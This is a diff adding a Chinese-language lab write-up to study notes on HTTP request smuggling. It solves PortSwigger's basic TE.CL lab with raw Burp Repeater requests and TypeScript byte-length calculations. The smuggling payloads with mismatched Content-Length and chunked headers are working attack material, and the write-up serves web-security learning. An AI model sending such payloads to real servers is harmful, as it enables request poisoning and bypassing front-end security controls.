@@ -197,6 +197,94 @@ Content-Length: 27
 3. 沒有 NodeJS 複雜的 event 機制
 4. 不用寫一堆 `\r\n`，只要按 Enter 鍵就是 `\r\n`
 
+但記得要在 Settings > Network > HTTP 取消勾選 "Default to HTTP/2 if server supports it"
+
+## Lab: HTTP request smuggling, basic TE.CL vulnerability
+
+| Dimension | Description                                                                  |
+| --------- | ---------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/request-smuggling#te-cl-vulnerabilities |
+| Lab       | https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl       |
+
+在 Burp Suite Repeater 構造
+
+```
+POST / HTTP/1.1
+Host: 0ae900a004d0e4fb80ad2b6a00aa0071.web-security-academy.net
+Content-Length: 4
+Transfer-Encoding: chunked
+
+55
+GPOST / HTTP/1.1
+Host: 0ae900a004d0e4fb80ad2b6a00aa0071.web-security-academy.net
+
+
+0
+
+
+```
+
+其中，Content-Length: 4 => `55\r\n`
+
+至於 55 則是
+
+```ts
+Buffer.byteLength(
+  `GPOST / HTTP/1.1\r\nHost: 0ae900a004d0e4fb80ad2b6a00aa0071.web-security-academy.net\r\n\r\n`,
+).toString(16);
+```
+
+這樣做雖然可以達到 HTTP Request Smuggling，但是沒辦法看到第二個 Response => 不是完美的 Solution
+
+是說，TE.CL 的情境，要自己手動算 byte length，為了避免不同作業系統對於換行符號的差異（LF, CRLF），所以用 template literal 搭配 `\r\n` 算起來才會是正確的 byte length
+
+後來我參考官方 Solution，花了 5 分鐘才讀懂這個設計，真的很精妙！我嘗試修改 Raw HTTP Request，讓其更好閱讀
+
+```
+POST / HTTP/1.1
+Host: 0a2900d0034df62380e0f3ed00fe00e5.web-security-academy.net
+Content-Length: 4
+Content-Type: text/plain
+Transfer-Encoding: chunked
+
+8e
+GPOST / HTTP/1.1
+Host: 0a2900d0034df62380e0f3ed00fe00e5.web-security-academy.net
+Content-Type: text/plain
+Content-Length: 19
+
+Only11Bytes
+0
+
+
+```
+
+長度計算
+
+```ts
+Buffer.byteLength(`8e\r\n`).toString(10); // 4
+Buffer.byteLength(
+  `GPOST / HTTP/1.1\r\nHost: 0a2900d0034df62380e0f3ed00fe00e5.web-security-academy.net\r\nContent-Type: text/plain\r\nContent-Length: 19\r\n\r\nOnly11Bytes`,
+).toString(16); // 8e
+Buffer.byteLength(`Only11Bytes\r\n0\r\n\r\n`); // 18
+```
+
+刻意在 smuggledRequest 的 `Content-Length` 設定 19，讓第一個 HTTP Request 送出時，smuggledRequest 保持在 unprocessed；等到第二個 HTTP Request 送出時，smuggledRequest 就會變成
+
+```
+GPOST / HTTP/1.1
+Host: 0a2900d0034df62380e0f3ed00fe00e5.web-security-academy.net
+Content-Type: text/plain
+Content-Length: 19
+
+Only11Bytes
+0
+
+P
+```
+
+只能說這招真的很精妙，理解的當下真的是覺得，能想到這個 Bypass 技巧的人類真的是大師～
+
 ## 參考資料
 
 - https://portswigger.net/web-security/request-smuggling
